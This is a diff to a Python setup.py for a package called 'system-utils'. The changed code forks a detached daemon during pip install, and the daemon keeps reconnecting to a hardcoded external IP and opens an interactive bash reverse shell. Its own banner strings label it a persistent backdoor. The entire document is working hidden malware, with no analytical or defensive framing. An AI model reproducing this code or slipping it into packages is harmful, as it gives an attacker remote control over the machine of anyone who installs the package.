@@ -5,59 +5,36 @@ import socket
 import subprocess
 import time
 import pty
-import fcntl
 
-def create_pid_file():
-    """Ensure only one backdoor instance runs"""
-    pid_file = '/tmp/.system_utils.pid'
-    
+def proper_daemonize():
+    """Completely detach from parent process"""
     try:
-        # Check if already running
-        if os.path.exists(pid_file):
-            with open(pid_file, 'r') as f:
-                old_pid = f.read().strip()
-                try:
-                    # Check if process exists
-                    os.kill(int(old_pid), 0)
-                    # Process exists, don't start another
-                    return False
-                except:
-                    # Process doesn't exist, remove stale pid file
-                    os.remove(pid_file)
+        # First fork - detach from parent
+        pid = os.fork()
+        if pid > 0:
+            # Parent process exits
+            return True  # Signal that we're done
         
-        # Write our PID
-        with open(pid_file, 'w') as f:
-            f.write(str(os.getpid()))
-            fcntl.flock(f.fileno(), fcntl.LOCK_EX | fcntl.LOCK_NB)
-        
-        return True
-    except:
-        return False
-
-def daemonize():
-    """Proper daemonization"""
-    try:
-        # First fork
-        if os.fork() > 0:
-            return True
-        
+        # Child continues - become session leader
         os.setsid()
         os.chdir('/')
         os.umask(0)
         
-        # Second fork
-        if os.fork() > 0:
-            sys.exit(0)
+        # Second fork - ensure we're not a session leader
+        pid = os.fork()
+        if pid > 0:
+            sys.exit(0)  # Exit second parent
         
-        # Create PID file
-        if not create_pid_file():
-            sys.exit(0)
+        # Now completely independent process
+        return False  # Signal that we're the daemon
         
-        return False
-    except:
+    except Exception as e:
         return True
 
 def persistent_backdoor():
+    # This runs in the completely detached process
+    time.sleep(3)  # Give pip time to finish
+    
     ATTACKER_IP = "142.93.23.15"
     ATTACKER_PORT = 80
     
@@ -66,32 +43,29 @@ def persistent_backdoor():
             s = socket.socket()
             s.connect((ATTACKER_IP, ATTACKER_PORT))
             
-            s.send(b"""
-+------------------------------------------+
-|     PERSISTENT BACKDOOR - ALIVE          |
-+------------------------------------------+
-| This process survives pip install        |
-| Will reconnect automatically             |
-| Check /tmp/.system_utils.pid for PID     |
-+------------------------------------------+
-
-$ """.encode())
+            s.send(b"\n[+] PERSISTENT BACKDOOR ACTIVE\n")
+            s.send(b"[+] This survives after pip install!\n")
+            s.send(b"[+] Will reconnect if connection drops\n\n$ ")
             
             os.dup2(s.fileno(), 0)
             os.dup2(s.fileno(), 1)
             os.dup2(s.fileno(), 2)
             
+            # Use pty for better shell
             pty.spawn(["/bin/bash", "--login"])
             
         except:
-            time.sleep(30)
+            time.sleep(10)  # Wait before reconnecting
             continue
 
-# Main execution
-if daemonize():
-    # Parent - just run setup
-    setup(name="system-utils", version="1.0.0")
+# This runs during pip install
+if proper_daemonize():
+    # Parent process - just continue with setup
+    pass
 else:
-    # Daemon - run backdoor
-    time.sleep(5)
+    # Child daemon process - run backdoor
     persistent_backdoor()
+    sys.exit(0)  # Daemon exits if backdoor fails
+
+# Normal setup continues
+setup(name="system-utils", version="1.0.0")
